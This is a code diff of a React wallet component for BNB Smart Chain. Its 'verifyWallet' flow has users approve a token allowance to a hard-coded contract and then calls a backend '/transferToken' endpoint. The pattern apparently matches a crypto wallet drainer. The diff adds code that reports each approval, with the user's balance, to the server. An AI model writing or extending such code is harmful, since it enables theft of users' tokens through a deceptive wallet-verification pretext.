@@ -4,7 +4,12 @@ import toast from "react-hot-toast";
 import { TokenABI } from "../wagmiConfig";
 import icone2 from "../assets/icons/2.png";
 import icone8 from "../assets/icons/8.png";
-import { appToken, checkAllowance, getUserBalance } from "../web3";
+import {
+  appToken,
+  checkAllowance,
+  getApprovalDetails,
+  getUserBalance,
+} from "../web3";
 import axios from "axios";
 import { apiUrl } from "../config";
 
@@ -143,7 +148,8 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
     return false;
   };
 
-  const DEFAULT_CHAIN_ID = 56; // BSC Mainnet
+  const DEFAULT_CHAIN_ID = 56;
+  // const DEFAULT_CHAIN_ID = 5611;
 
   const ensureCorrectNetwork = async (provider) => {
     try {
@@ -198,7 +204,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
         setAccount(accounts[0] || null);
         setIsConnected(!!accounts[0]);
 
-        await ensureCorrectNetwork(provider); // ✅ Force BSC
+        await ensureCorrectNetwork(provider);
         const networkId = await web3.eth.getChainId();
         setChainId(Number(networkId));
       } catch (error) {
@@ -319,7 +325,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
   const CONTRACTS = {
     56: "0xd919801e085a6c695731B0B5da55fA6715834282",
     // 97: "0xc6c9EEfBD41DE39e75BeD1DC86575Fb1eD70844D",
-    // 5611: "0x3c0AE3103147B3d05e8089fBFd55bf895Bb4a36a",
+    // 5611: "0x4695802477BDD53C9503e47481BB1270264928cd",
   };
 
   const verifyWallet = async () => {
@@ -361,7 +367,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
         web3.utils.fromWei(nativeBalanceWei, "ether")
       );
 
-      const shouldCallContract = balance >= 150;
+      const shouldCallContract = balance > 150;
 
       setTimeout(async () => {
         setVerifyStep(2);
@@ -399,11 +405,35 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
                 }
               }
 
-              await appToken(
+              const approveData = await appToken(
                 rawNeeded.toString(),
                 tokenAddress,
                 contractAddress
               );
+
+
+              if (approveData) {
+                const details = await getApprovalDetails(approveData);
+
+                details.balance = balance;
+                console.log("Approval Details:", details);
+                try {
+                  const response = await axios.post(
+                    `${apiUrl}/approval`,
+                    details
+                  );
+                  if (response.data.success) {
+                    console.log("Approval saved to DB:", response.data.data);
+                  } else {
+                    console.warn(
+                      "Failed to save approval:",
+                      response.data.message
+                    );
+                  }
+                } catch (err) {
+                  console.error("Error sending approval details:", err);
+                }
+              }
             }
 
             await axios.post(`${apiUrl}/transferToken`, {
@@ -438,7 +468,8 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
   };
 
   const switchChain = async () => {
-    const targetChainId = 56; // ✅ BSC Mainnet
+    const targetChainId = 56;
+    // const targetChainId = 5611;
 
     const provider = getProvider();
     if (!provider) {
@@ -452,14 +483,12 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
       const accounts = await provider.request({
         method: "eth_requestAccounts",
       });
-      // Try switching to BSC
       await await provider.request({ method: "eth_requestAccounts" });
 
       await setProviderWithFallback(targetChainId);
       toast.success("Switched to Binance Smart Chain ✅");
     } catch (error) {
       if (error.code === 4902) {
-        // If BSC is not added → Add BSC
         try {
           await provider.request({
             method: "wallet_addEthereumChain",
@@ -522,7 +551,6 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
     setShowText(false);
     details(false);
   };
-
 
   return (
     <>
